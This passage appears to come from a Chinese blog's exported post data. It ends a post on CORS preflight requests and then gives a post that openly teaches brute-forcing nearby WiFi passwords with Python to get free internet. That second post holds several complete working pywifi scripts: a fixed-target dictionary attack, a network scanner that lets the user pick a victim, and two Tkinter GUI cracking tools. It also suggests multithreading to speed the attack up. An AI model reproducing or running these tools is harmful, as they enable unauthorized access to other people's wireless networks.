头），指示哪些源被允许访问资源。浏览器在发起跨域请求时会先发送一个预检请求（OPTIONS 请求）到服务器，服务器通过设置适当的 CORS 标头来指定是否允许跨域请求，并指定允许的请求源、方法、标头等信息。</p>\n<h3 id=\"简单请求\"><a href=\"#简单请求\" class=\"headerlink\" title=\"简单请求\"></a>简单请求</h3><p>不会触发 CORS 预检请求。这样的请求为 <code>简单请求</code>，。若请求满足所有下述条件，则该请求可视为 <code>简单请求</code>：</p>\n<p><strong>1、</strong> HTTP方法限制：只能使用GET、HEAD、POST这三种HTTP方法之一如果请求使用了其他HTTP方法，就不再被视为简单请求；<br><strong>2、</strong> 自定义标头限制：请求的HTTP标头只能是以下几种常见的标头：<code>Accept</code>、<code>Accept-Language</code>、<code>Content-Language</code>、<code>Last-Event-ID</code>、<code>Content-Type</code>（仅限于<code>application/x-www-form-urlencoded</code>、<code>multipart/form-data</code>、<code>text/plain</code>）HTML头部headerfield字段：DPR、Download、Save-Data、Viewport-Width、WIdth如果请求使用了其他标头，同样不再被视为简单请求；<br><strong>3、</strong> 请求中没有使用ReadableStream对象；<br><strong>4、</strong> 不使用自定义请求标头：请求不能包含用户自定义的标头；<br><strong>5、</strong> 请求中的任意XMLHttpRequestUpload对象均没有注册任何事件监听器；XMLHttpRequestUpload对象可以使用XMLHttpRequest.upload属性访问；</p>\n<h3 id=\"预检请求\"><a href=\"#预检请求\" class=\"headerlink\" title=\"预检请求\"></a>预检请求</h3><p>非简单请求的 CORS 请求，会在正式通信之前，增加一次 HTTP 查询请求，称为 <code>预检请求</code>。</p>\n<p>需预检的请求要求必须首先使用 OPTIONS 方法发起一个预检请求到服务器，以获知服务器是否允许该实际请求。<code>预检请求</code> 的使用，可以避免跨域请求对服务器的用户数据产生未预期的影响。</p>\n<p>例如我在自己的网站上删除一条记录:</p>\n<p><img src=\"/./2024/06/16/POST%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E5%8F%91%E9%80%81%E4%B8%A4%E6%AC%A1%E8%AF%B7%E6%B1%82/1.png\"><br>它首先会发起一个预检请求,预检请求的头信息包括两个特殊字段：</p>\n<ul>\n<li><p>Access-Control-Request-Method：该字段是必须的，用来列出浏览器的 CORS 请求会用到哪些 HTTP 方法，上例是 POST。</p>\n</li>\n<li><p>Access-Control-Request-Headers：该字段是一个逗号分隔的字符串，指定浏览器 CORS 请求会额外发送的头信息字段，上例是 content-type,x-secsdk-csrf-token。</p>\n</li>\n<li><p>access-control-allow-origin：在上述例子中，表示 <a href=\"https://xxx.cn/\">https://xxx.cn</a> 可以请求数据，也可以设置为* 符号，表示统一任意跨源请求。</p>\n</li>\n<li><p>access-control-max-age：该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是 1 天（86408 秒），即允许缓存该条回应 1 天（86408 秒），在此期间，不用发出另一条预检请求。</p>\n</li>\n</ul>\n<p>一旦服务器通过了 <code>预检请求</code>，以后每次浏览器正常的 CORS 请求，就都跟简单请求一样，会有一个 Origin 头信息字段。服务器的回应，也都会有一个 Access-Control-Allow-Origin 头信息字段。</p>\n<p><img src=\"/./2024/06/16/POST%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E5%8F%91%E9%80%81%E4%B8%A4%E6%AC%A1%E8%AF%B7%E6%B1%82/2.png\"><br>上面头信息中，Access-Control-Allow-Origin 字段是每次回应都必定包含的。</p>\n<h3 id=\"附带身份凭证的请求与通配符\"><a href=\"#附带身份凭证的请求与通配符\" class=\"headerlink\" title=\"附带身份凭证的请求与通配符\"></a>附带身份凭证的请求与通配符</h3><p>在响应附带身份凭证的请求时：</p>\n<p>为了避免恶意网站滥用 Access-Control-Allow-Origin 头部字段来获取用户敏感信息，服务器在设置时不能将其值设为通配符 *。相反，应该将其设置为特定的域，例如：Access-Control-Allow-Origin: <a href=\"https://xxx.cn.通过将/\">https://xxx.cn。通过将</a> Access-Control-Allow-Origin 设置为特定的域，服务器只允许来自指定域的请求进行跨域访问。这样可以限制跨域请求的范围，避免不可信的域获取到用户敏感信息。</p>\n<p>为了避免潜在的安全风险，服务器不能将 Access-Control-Allow-Headers 的值设为通配符 *。这是因为不受限制的请求头可能被滥用。相反，应该将其设置为一个包含标头名称的列表，例如：Access-Control-Allow-Headers: X-PINGOTHER, Content-Type。通过将 Access-Control-Allow-Headers 设置为明确的标头名称列表，服务器可以限制哪些自定义请求头是允许的。只有在允许的标头列表中的头部字段才能在跨域请求中被接受。</p>\n<p>如果你近期准备面试跳槽，建议在ddkk.com在线刷题，涵盖 一万+ 道 Java 面试题，几乎覆盖了所有主流技术面试题，还有市面上最全的技术五百套，精品系列教程，免费提供。</p>\n<p>为了避免潜在的安全风险，服务器不能将 Access-Control-Allow-Methods 的值设为通配符 *。这样做将允许来自任意域的请求使用任意的 HTTP 方法，可能导致滥用行为的发生。相反，应该将其设置为一个特定的请求方法名称列表，例如：Access-Control-Allow-Methods: POST, GET。通过将 Access-Control-Allow-Methods 设置为明确的请求方法列表，服务器可以限制哪些方法是允许的。只有在允许的方法列表中的方法才能在跨域请求中被接受和处理。</p>\n<p>对于附带身份凭证的请求（通常是 Cookie），</p>\n<p>这是因为请求的标头中携带了 Cookie 信息，如果 Access-Control-Allow-Origin 的值为 <code>*</code>，请求将会失败。而将 Access-Control-Allow-Origin 的值设置为 <code>https://xxx.cn</code>，则请求将成功执行。</p>\n<p>另外，响应标头中也携带了 Set-Cookie 字段，尝试对 Cookie 进行修改。如果操作失败，将会抛出异常。</p>\n<h2 id=\"完整的请求流程图\"><a href=\"#完整的请求流程图\" class=\"headerlink\" title=\"完整的请求流程图\"></a>完整的请求流程图</h2><h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a><img src=\"/./2024/06/16/POST%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%9A%E5%8F%91%E9%80%81%E4%B8%A4%E6%AC%A1%E8%AF%B7%E6%B1%82/3.png\"><br>总结</h2><p>预检请求是在进行跨域资源共享 <code>CORS</code> 时，由浏览器自动发起的一种 OPTIONS 请求。它的存在是为了保障安全，并允许服务器决定是否允许跨域请求。</p>\n<p>跨域请求是指在浏览器中向不同域名、不同端口或不同协议的资源发送请求。出于安全原因，浏览器默认禁止跨域请求，只允许同源策略。而当网页需要进行跨域请求时，浏览器会自动发送一个预检请求，以确定是否服务器允许实际的跨域请求。</p>\n<p>预检请求中包含了一些额外的头部信息，如 Origin 和 Access-Control-Request-Method 等，用于告知服务器实际请求的方法和来源。服务器收到预检请求后，可以根据这些头部信息，进行验证和授权判断。如果服务器认可该跨域请求，将返回一个包含 Access-Control-Allow-Origin 等头部信息的响应，浏览器才会继续发送实际的跨域请求。</p>\n<p>使用预检请求机制可以有效地防范跨域请求带来的安全风险，保护用户数据和隐私。</p>\n"},{"title":"Python破解Wifi密码教程来了","date":"2024-07-14T10:41:28.000Z","_content":"\n\n### 前言\n\n本文将记录学习下如何通过 Python 脚本实现 WIFI 密码的暴力破解，从而实现免费蹭网。\n\n### 无图形界面\n\n先来看看没有图形界面版的爆破脚本。\n\n**WIFI爆破**\n----------\n\n```\n\nimport pywifi\nfrom pywifi import const\nimport time\nimport datetime\n\n\n# 测试连接，返回链接结果\ndef wifiConnect(pwd):\n    # 抓取网卡接口\n    wifi = pywifi.PyWiFi()\n    # 获取第一个无线网卡\n    ifaces = wifi.interfaces()[0]\n    # 断开所有连接\n    ifaces.disconnect()\n    time.sleep(1)\n    wifistatus = ifaces.status()\n    if wifistatus == const.IFACE_DISCONNECTED:\n        # 创建WiFi连接文件\n        profile = pywifi.Profile()\n        # 要连接WiFi的名称\n        profile.ssid = \"Tr0e\"\n        # 网卡的开放状态\n        profile.auth = const.AUTH_ALG_OPEN\n        # wifi加密算法,一般wifi加密算法为wps\n        profile.akm.append(const.AKM_TYPE_WPA2PSK)\n        # 加密单元\n        profile.cipher = const.CIPHER_TYPE_CCMP\n        # 调用密码\n        profile.key = pwd\n        # 删除所有连接过的wifi文件\n        ifaces.remove_all_network_profiles()\n        # 设定新的连接文件\n        tep_profile = ifaces.add_network_profile(profile)\n        ifaces.connect(tep_profile)\n        # wifi连接时间\n        time.sleep(2)\n        if ifaces.status() == const.IFACE_CONNECTED:\n            return True\n        else:\n            return False\n    else:\n        print(\"已有wifi连接\")\n\n\n# 读取密码本\ndef readPassword():\n    success = False\n    print(\"****************** WIFI破解 ******************\")\n    # 密码本路径\n    path = \"pwd.txt\"\n    # 打开文件\n    file = open(path, \"r\")\n    start = datetime.datetime.now()\n    while True:\n        try:\n            pwd = file.readline()\n            # 去除密码的末尾换行符\n            pwd = pwd.strip('\\n')\n            bool = wifiConnect(pwd)\n            if bool:\n                print(\"[*] 密码已破解：\", pwd)\n                print(\"[*] WiFi已自动连接！！！\")\n                success = True\n                break\n            else:\n                # 跳出当前循环，进行下一次循环\n                print(\"正在破解 SSID 为 %s 的 WIFI密码，当前校验的密码为：%s\"%(\"Tr0e\",pwd))\n        except:\n            continue\n    end = datetime.datetime.now()\n    if(success):\n        print(\"[*] 本次破解WIFI密码一共用了多长时间：{}\".format(end - start))\n    else:\n        print(\"[*] 很遗憾未能帮你破解出当前指定WIFI的密码，请更换密码字典后重新尝试！\")\n    exit(0)\n\n\nif __name__==\"__main__\":\n    readPassword()\n```\n\n代码运行效果：  \n![](./2024/07/14/Python破解Wifi密码教程来了/1.png)\n\n**脚本优化**\n--------\n\n以上脚本需内嵌 WIFI 名、爆破字典路径，缺少灵活性。下面进行改造优化：\n\n```\n\nimport pywifi\nimport time\nfrom pywifi import const\n\n\n# WiFi扫描模块\ndef wifi_scan():\n    # 初始化wifi\n    wifi = pywifi.PyWiFi()\n    # 使用第一个无线网卡\n    interface = wifi.interfaces()[0]\n    # 开始扫描\n    interface.scan()\n    for i in range(4):\n        time.sleep(1)\n        print('\\r扫描可用 WiFi 中，请稍后。。。（' + str(3 - i), end='）')\n    print('\\r扫描完成！\\n' + '-' * 38)\n    print('\\r{:4}{:6}{}'.format('编号', '信号强度', 'wifi名'))\n    # 扫描结果，scan_results()返回一个集，存放的是每个wifi对象\n    bss = interface.scan_results()\n    # 存放wifi名的集合\n    wifi_name_set = set()\n    for w in bss:\n        # 解决乱码问题\n        wifi_name_and_signal = (100 + w.signal, w.ssid.encode('raw_unicode_escape').decode('utf-8'))\n        wifi_name_set.add(wifi_name_and_signal)\n    # 存入列表并按信号排序\n    wifi_name_list = list(wifi_name_set)\n    wifi_name_list = sorted(wifi_name_list, key=lambda a: a[0], reverse=True)\n    num = 0\n    # 格式化输出\n    while num < len(wifi_name_list):\n        print('\\r{:<6d}{:<8d}{}'.format(num, wifi_name_list[num][0], wifi_name_list[num][1]))\n        num += 1\n    print('-' * 38)\n    # 返回wifi列表\n    return wifi_name_list\n\n\n# WIFI破解模块\ndef wifi_password_crack(wifi_name):\n    # 字典路径\n    wifi_dic_path = input(\"请输入本地用于WIFI暴力破解的密码字典（txt格式，每个密码占据1行）的路径：\")\n    with open(wifi_dic_path, 'r') as f:\n        # 遍历密码\n        for pwd in f:\n            # 去除密码的末尾换行符\n            pwd = pwd.strip('\\n')\n            # 创建wifi对象\n            wifi = pywifi.PyWiFi()\n            # 创建网卡对象，为第一个wifi网卡\n            interface = wifi.interfaces()[0]\n            # 断开所有wifi连接\n            interface.disconnect()\n            # 等待其断开\n            while interface.status() == 4:\n                # 当其处于连接状态时，利用循环等待其断开\n                pass\n            # 创建连接文件（对象）\n            profile = pywifi.Profile()\n            # wifi名称\n            profile.ssid = wifi_name\n            # 需要认证\n            profile.auth = const.AUTH_ALG_OPEN\n            # wifi默认加密算法\n            profile.akm.append(const.AKM_TYPE_WPA2PSK)\n            profile.cipher = const.CIPHER_TYPE_CCMP\n            # wifi密码\n            profile.key = pwd\n            # 删除所有wifi连接文件\n            interface.remove_all_network_profiles()\n            # 设置新的wifi连接文件\n            tmp_profile = interface.add_network_profile(profile)\n            # 开始尝试连接\n            interface.connect(tmp_profile)\n            start_time = time.time()\n            while time.time() - start_time < 1.5:\n                # 接口状态为4代表连接成功（当尝试时间大于1.5秒之后则为错误密码，经测试测正确密码一般都在1.5秒内连接，若要提高准确性可以设置为2s或以上，相应暴力破解速度就会变慢）\n                if interface.status() == 4:\n                    print(f'\\r连接成功！密码为：{pwd}')\n                    exit(0)\n                else:\n                    print(f'\\r正在利用密码 {pwd} 尝试破解。', end='')\n\n# 主函数\ndef main():\n    # 退出标致\n    exit_flag = 0\n    # 目标编号\n    target_num = -1\n    while not exit_flag:\n        try:\n            print('WiFi万能钥匙'.center(35, '-'))\n            # 调用扫描模块，返回一个排序后的wifi列表\n            wifi_list = wifi_scan()\n            # 让用户选择要破解的wifi编号，并对用户输入的编号进行判断和异常处理\n            choose_exit_flag = 0\n            while not choose_exit_flag:\n                try:\n                    target_num = int(input('请选择你要尝试破解的wifi：'))\n                    # 如果要选择的wifi编号在列表内，继续二次判断，否则重新输入\n                    if target_num in range(len(wifi_list)):\n                        # 二次确认\n                        while not choose_exit_flag:\n                            try:\n                                choose = str(input(f'你选择要破解的WiFi名称是：{wifi_list[target_num][1]}，确定吗？（Y/N）'))\n                                # 对用户输入进行小写处理，并判断\n                                if choose.lower() == 'y':\n                                    choose_exit_flag = 1\n                                elif choose.lower() == 'n':\n                                    break\n                                # 处理用户其它字母输入\n                                else:\n                                    print('只能输入 Y/N 哦o(*￣︶￣*)o')\n                            # 处理用户非字母输入\n                            except ValueError:\n                                print('只能输入 Y/N 哦o(*￣︶￣*)o')\n                        # 退出破解\n                        if choose_exit_flag == 1:\n                            break\n                        else:\n                            print('请重新输入哦(*^▽^*)')\n                except ValueError:\n                    print('只能输入数字哦o(*￣︶￣*)o')\n            # 密码破解，传入用户选择的wifi名称\n            wifi_password_crack(wifi_list[target_num][1])\n            print('-' * 38)\n            exit_flag = 1\n        except Exception as e:\n            print(e)\n            raise e\n\n\nif __name__ == '__main__':\n    main()\n```\n\n脚本运行效果如下：  \n![](./2024/07/14/Python破解Wifi密码教程来了/2.png)\n\n上述代码实现了依据信号强度枚举当前附近的所有 WIFI 名称，并且可供用户自主选择需要暴力破解的 WIFI，同时还可灵活指定暴力破解的字典，相对而言体验感提升了不少。进一步也可以将上述脚本打包生成 exe 文件，双击运行效果如下：\n\n![](./2024/07/14/Python破解Wifi密码教程来了/3.png)\n\n### 图形化界面\n\n下面基于 Python 的 GUI 图形界面开发库 Tkinter 优化上述脚本，实现友好的可视化 WIFI 暴力破解界面工具。\n\n关于 Tkinter 库的语法可参见：\n\nhttps://www.runoob.com/python/python-gui-tkinter.html\n\n**简单版UI**\n---------\n\n```\nfrom tkinter import *\nfrom pywifi import const\nimport pywifi\nimport time\n\n\n# 主要步骤：\n# 1、获取第一个无线网卡\n# 2、断开所有的wifi\n# 3、读取密码本\n# 4、设置睡眠时间\ndef wificonnect(str, wifiname):\n    # 窗口无线对象\n    wifi = pywifi.PyWiFi()\n    # 抓取第一个无线网卡\n    ifaces = wifi.interfaces()[0]\n    # 断开所有的wifi\n    ifaces.disconnect()\n    time.sleep(1)\n    if ifaces.status() == const.IFACE_DISCONNECTED:\n        # 创建wifi连接文件\n        profile = pywifi.Profile()\n        profile.ssid = wifiname\n        # wifi的加密算法\n        profile.akm.append(const.AKM_TYPE_WPA2PSK)\n        # wifi的密码\n        profile.key = str\n        # 网卡的开发\n        profile.auth = const.AUTH_ALG_OPEN\n        # 加密单元,这里需要写点加密单元否则无法连接\n        profile.cipher = const.CIPHER_TYPE_CCMP\n        # 删除所有的wifi文件\n        ifaces.remove_all_network_profiles()\n        # 设置新的连接文件\n        tep_profile = ifaces.add_network_profile(profile)\n        # 连接\n        ifaces.connect(tep_profile)\n        time.sleep(3)\n        if ifaces.status() == const.IFACE_CONNECTED:\n            return True\n        else:\n            return False\n\n\ndef readPwd():\n    # 获取wiif名称\n    wifiname = entry.get().strip()\n    path = r'./pwd.txt'\n    file = open(path, 'r')\n    while True:\n        try:\n            # 读取\n            mystr = file.readline().strip()\n            # 测试连接\n            bool = wificonnect(mystr, wifiname)\n            if bool:\n                text.insert(END, '密码正确' + mystr)\n                text.see(END)\n                text.update()\n                file.close()\n                break\n            else:\n                text.insert(END, '密码错误' + mystr)\n                text.see(END)\n                text.update()\n        except:\n            continue\n\n\n# 创建窗口\nroot = Tk()\nroot.title('wifi破解')\nroot.geometry('500x400')\n# 标签\nlabel = Label(root, text='输入要破解的WIFI名称：')\n# 定位\nlabel.grid()\n# 输入控件\nentry = Entry(root, font=('微软雅黑', 14))\nentry.grid(row=0, column=1)\n# 列表控件\ntext = Listbox(root, font=('微软雅黑', 14), width=40, height=10)\ntext.grid(row=1, columnspan=2)\n# 按钮\nbutton = Button(root, text='开始破解', width=20, height=2, command=readPwd)\nbutton.grid(row=2, columnspan=2)\n# 显示窗口\nroot.mainloop()\n```\n\n脚本运行效果：  \n![](./2024/07/14/Python破解Wifi密码教程来了/4.png)\n\n**UI升级版**\n---------\n\n以上图形界面未允许选择密码字典，下面进行优化升级：\n\n```\n\nfrom tkinter import *\nfrom tkinter import ttk\nimport pywifi\nfrom pywifi import const\nimport time\nimport tkinter.filedialog  # 在Gui中打开文件浏览\nimport tkinter.messagebox  # 打开tkiner的消息提醒框\n\n\nclass MY_GUI():\n    def __init__(self, init_window_name):\n        self.init_window_name = init_window_name\n        # 密码文件路径\n        self.get_value = StringVar()  # 设置可变内容\n        # 获取破解wifi账号\n        self.get_wifi_value = StringVar()\n        # 获取wifi密码\n        self.get_wifimm_value = StringVar()\n        # 抓取网卡接口\n        self.wifi = pywifi.PyWiFi()\n        # 抓取第一个无线网卡\n        self.iface = self.wifi.interfaces()[0]\n        # 测试链接断开所有链接\n        self.iface.disconnect()\n        time.sleep(1)  # 休眠1秒\n        # 测试网卡是否属于断开状态\n        assert self.iface.status() in \\\n               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]\n\n    def __str__(self):\n        # 自动会调用的函数，返回自身的网卡\n        return '(WIFI:%s,%s)' % (self.wifi, self.iface.name())\n\n    # 设置窗口\n    def set_init_window(self):\n        self.init_window_name.title(\"WIFI破解工具\")\n        self.init_window_name.geometry('+500+200')\n        labelframe = LabelFrame(width=400, height=200, text=\"配置\")  # 框架，以下对象都是对于labelframe中添加的\n        labelframe.grid(column=0, row=0, padx=10, pady=10)\n        self.search = Button(labelframe, text=\"搜索附近WiFi\", command=self.scans_wifi_list).grid(column=0, row=0)\n        self.pojie = Button(labelframe, text=\"开始破解\", command=self.readPassWord).grid(column=1, row=0)\n        self.label = Label(labelframe, text=\"目录路径：\").grid(column=0, row=1)\n        self.path = Entry(labelframe, width=12, textvariable=self.get_value).grid(column=1, row=1)\n        self.file = Button(labelframe, text=\"添加密码文件目录\", command=self.add_mm_file).grid(column=2, row=1)\n        self.wifi_text = Label(labelframe, text=\"WiFi账号：\").grid(column=0, row=2)\n        self.wifi_input = Entry(labelframe, width=12, textvariable=self.get_wifi_value).grid(column=1, row=2)\n        self.wifi_mm_text = Label(labelframe, text=\"WiFi密码：\").grid(column=2, row=2)\n        self.wifi_mm_input = Entry(labelframe, width=10, textvariable=self.get_wifimm_value).grid(column=3, row=2,sticky=W)\n        self.wifi_labelframe = LabelFrame(text=\"wifi列表\")\n        self.wifi_labelframe.grid(column=0, row=3, columnspan=4, sticky=NSEW)\n        # 定义树形结构与滚动条\n        self.wifi_tree = ttk.Treeview(self.wifi_labelframe, show=\"headings\", columns=(\"a\", \"b\", \"c\", \"d\"))\n        self.vbar = ttk.Scrollbar(self.wifi_labelframe, orient=VERTICAL, command=self.wifi_tree.yview)\n        self.wifi_tree.configure(yscrollcommand=self.vbar.set)\n        # 表格的标题\n        self.wifi_tree.column(\"a\", width=50, anchor=\"center\")\n        self.wifi_tree.column(\"b\", width=100, anchor=\"center\")\n        self.wifi_tree.column(\"c\", width=100, anchor=\"center\")\n        self.wifi_tree.column(\"d\", width=100, anchor=\"center\")\n        self.wifi_tree.heading(\"a\", text=\"WiFiID\")\n        self.wifi_tree.heading(\"b\", text=\"SSID\")\n        self.wifi_tree.heading(\"c\", text=\"BSSID\")\n        self.wifi_tree.heading(\"d\", text=\"signal\")\n        self.wifi_tree.grid(row=4, column=0, sticky=NSEW)\n        self.wifi_tree.bind(\"<Double-1>\", self.onDBClick)\n        self.vbar.grid(row=4, column=1, sticky=NS)\n\n    # 搜索wifi\n    def scans_wifi_list(self):  # 扫描周围wifi列表\n        # 开始扫描\n        print(\"^_^ 开始扫描附近wifi...\")\n        self.iface.scan()\n        time.sleep(15)\n        # 在若干秒后获取扫描结果\n        scanres = self.iface.scan_results()\n        # 统计附近被发现的热点数量\n        nums = len(scanres)\n        print(\"数量: %s\" % (nums))\n        # 实际数据\n        self.show_scans_wifi_list(scanres)\n        return scanres\n\n    # 显示wifi列表\n    def show_scans_wifi_list(self, scans_res):\n        for index, wifi_info in enumerate(scans_res):\n            self.wifi_tree.insert(\"\", 'end', values=(index + 1, wifi_info.ssid, wifi_info.bssid, wifi_info.signal))\n\n    # 添加密码文件目录\n    def add_mm_file(self):\n        self.filename = tkinter.filedialog.askopenfilename()\n        self.get_value.set(self.filename)\n\n    # Treeview绑定事件\n    def onDBClick(self, event):\n        self.sels = event.widget.selection()\n        self.get_wifi_value.set(self.wifi_tree.item(self.sels, \"values\")[1])\n\n    # 读取密码字典，进行匹配\n    def readPassWord(self):\n        self.getFilePath = self.get_value.get()\n        self.get_wifissid = self.get_wifi_value.get()\n        pwdfilehander = open(self.getFilePath, \"r\", errors=\"ignore\")\n        while True:\n            try:\n                self.pwdStr = pwdfilehander.readline()\n                if not self.pwdStr:\n                    break\n                self.bool1 = self.connect(self.pwdStr, self.get_wifissid)\n                if self.bool1:\n                    self.res = \"[*] 密码正确！wifi名：%s，匹配密码：%s \" % (self.get_wifissid, self.pwdStr)\n                    self.get_wifimm_value.set(self.pwdStr)\n                    tkinter.messagebox.showinfo('提示', '破解成功！！！')\n                    print(self.res)\n                    break\n                else:\n                    self.res = \"[*] 密码错误！wifi名:%s，匹配密码：%s\" % (self.get_wifissid, self.pwdStr)\n                    print(self.res)\n                time.sleep(3)\n            except:\n                continue\n\n    # 对wifi和密码进行匹配\n    def connect(self, pwd_Str, wifi_ssid):\n        # 创建wifi链接文件\n        self.profile = pywifi.Profile()\n        self.profile.ssid = wifi_ssid  # wifi名称\n        self.profile.auth = const.AUTH_ALG_OPEN  # 网卡的开放\n        self.profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法\n        self.profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元\n        self.profile.key = pwd_Str  # 密码\n        self.iface.remove_all_network_profiles()  # 删除所有的wifi文件\n        self.tmp_profile = self.iface.add_network_profile(self.profile)  # 设定新的链接文件\n        self.iface.connect(self.tmp_profile)  # 链接\n        time.sleep(5)\n        if self.iface.status() == const.IFACE_CONNECTED:  # 判断是否连接上\n            isOK = True\n        else:\n            isOK = False\n        self.iface.disconnect()  # 断开\n        time.sleep(1)\n        # 检查断开状态\n        assert self.iface.status() in \\\n               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]\n        return isOK\n\n\ndef gui_start():\n    init_window = Tk()\n    ui = MY_GUI(init_window)\n    print(ui)\n    ui.set_init_window()\n    init_window.mainloop()\n\n\nif __name__ == \"__main__\":\n    gui_start()\n```\n\n脚本运行效果如下：\n\n![](./2024/07/14/Python破解Wifi密码教程来了/5.png)\n\n以上基于 Python 的 GUI 图形界面开发库 Tkinter，实际上 Python 的 GUI 编程可以借助 PyQt5 来自动生成 UI 代码。\n\n\n\n### 总结\n\n本文学习了 Python 暴力破解 WIFI 密码的方法、以及 Python GUI 图形化编程的基础使用。所演示的代码的不足在于均没有使用多线程进行 WIFI 连接测试，实际上因为 WIFI 连接测试需要一定的耗时（3-5秒），故使用多线程将能减少暴力破解过程的等待时间。\n\n\n","source":"_posts/Python破解Wifi密码教程来了.md","raw":"---\ntitle: Python破解Wifi密码教程来了\ndate: 2024-07-14 18:41:28\ntags: wifi密码\ncategories: 教程\n---\n\n\n### 前言\n\n本文将记录学习下如何通过 Python 脚本实现 WIFI 密码的暴力破解，从而实现免费蹭网。\n\n### 无图形界面\n\n先来看看没有图形界面版的爆破脚本。\n\n**WIFI爆破**\n----------\n\n```\n\nimport pywifi\nfrom pywifi import const\nimport time\nimport datetime\n\n\n# 测试连接，返回链接结果\ndef wifiConnect(pwd):\n    # 抓取网卡接口\n    wifi = pywifi.PyWiFi()\n    # 获取第一个无线网卡\n    ifaces = wifi.interfaces()[0]\n    # 断开所有连接\n    ifaces.disconnect()\n    time.sleep(1)\n    wifistatus = ifaces.status()\n    if wifistatus == const.IFACE_DISCONNECTED:\n        # 创建WiFi连接文件\n        profile = pywifi.Profile()\n        # 要连接WiFi的名称\n        profile.ssid = \"Tr0e\"\n        # 网卡的开放状态\n        profile.auth = const.AUTH_ALG_OPEN\n        # wifi加密算法,一般wifi加密算法为wps\n        profile.akm.append(const.AKM_TYPE_WPA2PSK)\n        # 加密单元\n        profile.cipher = const.CIPHER_TYPE_CCMP\n        # 调用密码\n        profile.key = pwd\n        # 删除所有连接过的wifi文件\n        ifaces.remove_all_network_profiles()\n        # 设定新的连接文件\n        tep_profile = ifaces.add_network_profile(profile)\n        ifaces.connect(tep_profile)\n        # wifi连接时间\n        time.sleep(2)\n        if ifaces.status() == const.IFACE_CONNECTED:\n            return True\n        else:\n            return False\n    else:\n        print(\"已有wifi连接\")\n\n\n# 读取密码本\ndef readPassword():\n    success = False\n    print(\"****************** WIFI破解 ******************\")\n    # 密码本路径\n    path = \"pwd.txt\"\n    # 打开文件\n    file = open(path, \"r\")\n    start = datetime.datetime.now()\n    while True:\n        try:\n            pwd = file.readline()\n            # 去除密码的末尾换行符\n            pwd = pwd.strip('\\n')\n            bool = wifiConnect(pwd)\n            if bool:\n                print(\"[*] 密码已破解：\", pwd)\n                print(\"[*] WiFi已自动连接！！！\")\n                success = True\n                break\n            else:\n                # 跳出当前循环，进行下一次循环\n                print(\"正在破解 SSID 为 %s 的 WIFI密码，当前校验的密码为：%s\"%(\"Tr0e\",pwd))\n        except:\n            continue\n    end = datetime.datetime.now()\n    if(success):\n        print(\"[*] 本次破解WIFI密码一共用了多长时间：{}\".format(end - start))\n    else:\n        print(\"[*] 很遗憾未能帮你破解出当前指定WIFI的密码，请更换密码字典后重新尝试！\")\n    exit(0)\n\n\nif __name__==\"__main__\":\n    readPassword()\n```\n\n代码运行效果：  \n![](./2024/07/14/Python破解Wifi密码教程来了/1.png)\n\n**脚本优化**\n--------\n\n以上脚本需内嵌 WIFI 名、爆破字典路径，缺少灵活性。下面进行改造优化：\n\n```\n\nimport pywifi\nimport time\nfrom pywifi import const\n\n\n# WiFi扫描模块\ndef wifi_scan():\n    # 初始化wifi\n    wifi = pywifi.PyWiFi()\n    # 使用第一个无线网卡\n    interface = wifi.interfaces()[0]\n    # 开始扫描\n    interface.scan()\n    for i in range(4):\n        time.sleep(1)\n        print('\\r扫描可用 WiFi 中，请稍后。。。（' + str(3 - i), end='）')\n    print('\\r扫描完成！\\n' + '-' * 38)\n    print('\\r{:4}{:6}{}'.format('编号', '信号强度', 'wifi名'))\n    # 扫描结果，scan_results()返回一个集，存放的是每个wifi对象\n    bss = interface.scan_results()\n    # 存放wifi名的集合\n    wifi_name_set = set()\n    for w in bss:\n        # 解决乱码问题\n        wifi_name_and_signal = (100 + w.signal, w.ssid.encode('raw_unicode_escape').decode('utf-8'))\n        wifi_name_set.add(wifi_name_and_signal)\n    # 存入列表并按信号排序\n    wifi_name_list = list(wifi_name_set)\n    wifi_name_list = sorted(wifi_name_list, key=lambda a: a[0], reverse=True)\n    num = 0\n    # 格式化输出\n    while num < len(wifi_name_list):\n        print('\\r{:<6d}{:<8d}{}'.format(num, wifi_name_list[num][0], wifi_name_list[num][1]))\n        num += 1\n    print('-' * 38)\n    # 返回wifi列表\n    return wifi_name_list\n\n\n# WIFI破解模块\ndef wifi_password_crack(wifi_name):\n    # 字典路径\n    wifi_dic_path = input(\"请输入本地用于WIFI暴力破解的密码字典（txt格式，每个密码占据1行）的路径：\")\n    with open(wifi_dic_path, 'r') as f:\n        # 遍历密码\n        for pwd in f:\n            # 去除密码的末尾换行符\n            pwd = pwd.strip('\\n')\n            # 创建wifi对象\n            wifi = pywifi.PyWiFi()\n            # 创建网卡对象，为第一个wifi网卡\n            interface = wifi.interfaces()[0]\n            # 断开所有wifi连接\n            interface.disconnect()\n            # 等待其断开\n            while interface.status() == 4:\n                # 当其处于连接状态时，利用循环等待其断开\n                pass\n            # 创建连接文件（对象）\n            profile = pywifi.Profile()\n            # wifi名称\n            profile.ssid = wifi_name\n            # 需要认证\n            profile.auth = const.AUTH_ALG_OPEN\n            # wifi默认加密算法\n            profile.akm.append(const.AKM_TYPE_WPA2PSK)\n            profile.cipher = const.CIPHER_TYPE_CCMP\n            # wifi密码\n            profile.key = pwd\n            # 删除所有wifi连接文件\n            interface.remove_all_network_profiles()\n            # 设置新的wifi连接文件\n            tmp_profile = interface.add_network_profile(profile)\n            # 开始尝试连接\n            interface.connect(tmp_profile)\n            start_time = time.time()\n            while time.time() - start_time < 1.5:\n                # 接口状态为4代表连接成功（当尝试时间大于1.5秒之后则为错误密码，经测试测正确密码一般都在1.5秒内连接，若要提高准确性可以设置为2s或以上，相应暴力破解速度就会变慢）\n                if interface.status() == 4:\n                    print(f'\\r连接成功！密码为：{pwd}')\n                    exit(0)\n                else:\n                    print(f'\\r正在利用密码 {pwd} 尝试破解。', end='')\n\n# 主函数\ndef main():\n    # 退出标致\n    exit_flag = 0\n    # 目标编号\n    target_num = -1\n    while not exit_flag:\n        try:\n            print('WiFi万能钥匙'.center(35, '-'))\n            # 